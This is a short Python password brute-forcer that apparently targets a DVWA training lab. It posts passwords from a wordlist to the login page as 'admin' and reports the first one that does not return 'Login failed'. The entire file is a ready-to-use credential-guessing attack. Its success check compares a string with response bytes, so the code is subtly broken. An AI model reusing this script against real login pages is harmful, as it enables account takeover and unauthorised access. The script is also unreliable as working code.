import requests


if __name__ == '__main__':
    target_url = "http://10.10.10.10/dvwa/login.php"
    data_dict = {"username": "admin", "password": "", "Login": "submit"}

    with open("D:\\passwords.txt", "r") as wordlist_file:
        for line in wordlist_file:
            word = line.strip()
            data_dict["password"] = word
            response = requests.post(target_url, data=data_dict)
            
            if "Login failed" not in response.content:
                print("[+] Got the password --> " + word)
                exit()
                
    print("[+] Reached end of line.")
